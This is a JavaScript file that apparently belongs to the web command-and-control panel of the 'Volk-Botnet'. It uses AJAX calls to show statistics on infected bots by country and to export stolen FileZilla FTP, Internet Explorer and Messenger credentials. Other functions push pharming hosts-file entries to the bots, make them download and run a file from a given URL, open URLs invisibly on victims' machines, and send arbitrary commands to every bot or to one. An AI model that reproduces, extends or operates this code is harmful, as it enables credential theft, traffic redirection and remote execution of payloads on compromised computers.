function AjaxLoad_3(__url ,  __variables , __donde){

	$.ajax( {
		async:true,
		dataType: "html",
		type: "POST",
		url: __url ,
		data: __variables,
		global: true,
		ifModified: false,
		processData:true,
		contentType: "application/x-www-form-urlencoded",
		success: function(datos){
			$(__donde).html(datos);
			//alert(datos);
			return false ;
		}
	});
	return false ;
}
function AjaxLoad_2(__url ,  __variables , __donde){

	$.ajax( {
		async:true,
		dataType: "html",
		type: "GET",
		url: __url ,
		data: __variables,
		global: true,
		ifModified: false,
		processData:true,
		contentType: "application/x-www-form-urlencoded",
		success: function(datos){
			$(__donde).html(datos);
			//alert(datos);
		}
	});
	return false ;
}



function objetoAjax(){
	var xmlhttp=false;
	try {
		xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
	} catch (e) {
		try {
		   xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		} catch (E) {
			xmlhttp = false;
  		}
	}
	if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
		xmlhttp = new XMLHttpRequest();
	}
	return xmlhttp;
}


function Pagina(nropagina , pais){
	divContenido = document.getElementById('table_estadisticas');
	ajax=objetoAjax();
	ajax.open("GET", "Controladores/Estadisticas/Estadisticas.php?pag="+nropagina+"&pais="+pais);
	divContenido.innerHTML= '<img src="archivos/imagen/ajax.gif">';
	ajax.onreadystatechange=function() {
		if (ajax.readyState==4) {
			//mostrar resultados en esta capa
			divContenido.innerHTML = ajax.responseText
		}
	}
	ajax.send(null)
}


function Salir(){
	var __confirm = confirm("You are disconnected from Volk-Botnet?.");
	if( !__confirm ){ return false ; }
	AjaxLoad_3("Controladores/Salir.php" , 0 , "body");
}
function Inicio(){
	ajax_load('Vistas/Inicio.php',  "div_ajax");
	return false ;
}
function taskmanger(){
	AjaxLoad_3("Controladores/TaskManger/TaskManger.php" , 0 , "#table_cmd");
	setTimeout("taskmanger()",10000);
	return false ;
}
$(document).ready(function() {					   
	Estadisticas();					   
	Inicio() ;
	taskmanger();
});

function Estadisticasbots(id){
	ajax_load('Controladores/Estadisticas/Estadisticas.php?pais='+id, 'table_estadisticas');
}

function Estadisticasftp(id){
	ajax_load('Controladores/FileZilla/Filezilla.php?pais='+id, 'table_estadisticas');
}

function EstadisticasIE(id){
	ajax_load('Controladores/InternetExplorer/InternetExplorer.php?pais='+id, 'table_estadisticas');
}
function EstadisticasMSN(id){
	ajax_load('Controladores/Messenger/Messenger.php?pais='+id, 'table_estadisticas');
}

function submitpharming(){
		
		var _pharming = document.getElementById('pharming').value;
		var _status = document.getElementById('status').value;
		
	var __confirm = confirm("sure to save the data?");
	if( !__confirm ){ return false ; }
	
		if(_pharming == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the content hosts.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}

		if(_pharming != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var _pharming = _pharming.replace(new RegExp('\\n','g'),'%0D%0A');
			ajax_load('Controladores/Pharming/Pharming.php?pharming='+_pharming+'&status='+_status, 'mensajebot');
			return false ;
			
		}
}

function Act_Commands(id , name){
	var __confirm = confirm("Entering the commands area?.");
	if( !__confirm ){ return false ; }
	ajax_load('Vistas/TaskManger/TaskMangerId.php?id='+id+'&name='+name, 'table_estadisticas');
}


function Des_Commands(id , name){
	var __confirm = confirm("Entering the commands area.");
	if( !__confirm ){ return false ; }
	ajax_load('Vistas/TaskManger/TaskMangerId.php?id='+id+'&name='+name, 'table_estadisticas');
}




function submitExecute(){
		
		var _url = document.getElementById('https').value;
		var _ejecutar = document.getElementById('ExecuteHttp').value;

		
	var __confirm = confirm("This sure to keep the data?.");
	if( !__confirm ){ return false ; }
	
		if(_url == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the URL of the file to download.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}
		if(_ejecutar == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the path to Run.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}


		if( _url != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var Ruta = 'https='+_url+'&ExecuteHttp='+_ejecutar ;
			ajax_load('Controladores/Donwloader/Donwloader.php?'+Ruta , 'mensajebot');
			return false ;
		}
}
function SaveUser(){
	var _User = document.getElementById('User').value;
	var _Pasw = document.getElementById('Pasw').value;
	
 var __confirm = confirm("This sure to keep the data?.");
	if( !__confirm ){ return false ; }
	
	if(_User == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the name Administrator.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}
		if(_Pasw == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the Password Manager.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}

		if( _User != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var Ruta = 'User='+_User+'&Pasw='+_Pasw ;
			ajax_load('Controladores/Setups/Setups.php?'+Ruta , 'mensajebot');
			return false ;
		}
}



function ExportarFTP(){
	
	var _Pais = document.getElementById('pais').value;
	
	var __confirm = confirm("This secure FTP export?.");
	if( !__confirm ){ return false ; }

	
	if( _Pais != ''){
			
			var Ruta = 'pais='+_Pais ;
			window.open('Controladores/FileZilla/FilezillaExport.php?'+Ruta , 'mensajebot');
			return false ;
		}
	
	
}
function ExportarIE(){
	
	var _Pais = document.getElementById('pais').value;
	
	var __confirm = confirm("This secure InternetExplorer export?.");
	if( !__confirm ){ return false ; }

	
	if( _Pais != ''){
			
			var Ruta = 'pais='+_Pais ;
			window.open('Controladores/InternetExplorer/InternetExplorerExport.php?'+Ruta , 'mensajebot');
			return false ;
		}
	
	
}
function ExportarMSN(){
	
	var _Pais = document.getElementById('pais').value;
	
	var __confirm = confirm("This secure Messenger export?.");
	if( !__confirm ){ return false ; }

	
	if( _Pais != ''){
			
			var Ruta = 'pais='+_Pais ;
			window.open('Controladores/Messenger/MessengerExport.php?'+Ruta , 'mensajebot');
			return false ;
		}
	
	
}
function ExportarMSN2(){
	
	var _Pais = document.getElementById('pais').value;
	
	var __confirm = confirm("This secure Messenger export?.");
	if( !__confirm ){ return false ; }

	
	if( _Pais != ''){
			
			var Ruta = 'pais='+_Pais ;
			ajax_load('Controladores/Messenger/MessengerExport2.php?'+Ruta , 'mensajebot');
			return false ;
		}
	
	
}
function submitInternetExplorer() {
	
	var _url = document.getElementById('domin').value;
	
	var __confirm = confirm("Sure to keep the URLs?.");
	if( !__confirm ){ return false ; }
	
	
	if(_url == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the url.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}


		if( _url != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var Ruta = 'domin='+_url ;
			ajax_load('Controladores/OpenExplorer/ExplorerInsert.php?'+Ruta , 'mensajebot');
			return false ;
		}
	
	
	
	
}
function submitInternetExplorer2() {
	
	var _url = document.getElementById('ExecuteHttp2').value;
	
	var __confirm = confirm("Sure to keep the URL invisible?.");
	if( !__confirm ){ return false ; }
	
	
	if(_url == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the url.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot2').innerHTML = cadena ;
			return false ;
		}


		if( _url != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot2').innerHTML = cadena ;
			var Ruta = 'ExecuteHttp2='+_url ;
			ajax_load('Controladores/OpenExplorer/ExplorerInsert2.php?'+Ruta , 'mensajebot2');
			return false ;
		}
	
	
	
	
}
function CmdsBots() {
	
	var _cmds = document.getElementById('ComandosCmds').value;
	
	var __confirm = confirm("Sure to send the commands.");
	if( !__confirm ){ return false ; }
	
	
	if(_cmds == ''){
			cadena = '<font face="Tahoma" size="2">Please Enter the commands.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mgsboxCmds').innerHTML = cadena ;
			return false ;
		}


		if( _cmds != ''){
			cadena = '<font face="Tahoma" size="2">Commands were sent, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mgsboxCmds').innerHTML = cadena ;
			var Ruta = 'ComandosCmds='+_cmds ;
			ajax_pload('Controladores/TaskManger/TaskMangerInsert.php?' ,Ruta, 'mgsboxCmds');
			return false ;
		}
	
	
	
	
}
function CmdsBotsID() {
	
	var _cmds = document.getElementById('ComandosCmds').value;
	var _name = document.getElementById('nombre').value;
	
	var __confirm = confirm("Sure to send the commands.");
	if( !__confirm ){ return false ; }
	
	
	if(_cmds == ''){
			cadena = '<font face="Tahoma" size="2">Please Enter the commands.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mgsboxCmds').innerHTML = cadena ;
			return false ;
		}
	if(_name == ''){
			cadena = '<font face="Tahoma" size="2">Please Enter the commands.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mgsboxCmds').innerHTML = cadena ;
			return false ;
		}


		if( _cmds != ''){
			cadena = '<font face="Tahoma" size="2">Commands were sent, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mgsboxCmds').innerHTML = cadena ;
			var Ruta = 'name='+_name+'&ComandosCmds='+_cmds ;
			ajax_pload('Controladores/TaskManger/TaskMangerInsertId.php?' ,Ruta, 'mgsboxCmds');
			return false ;
		}
	
	
	
	
}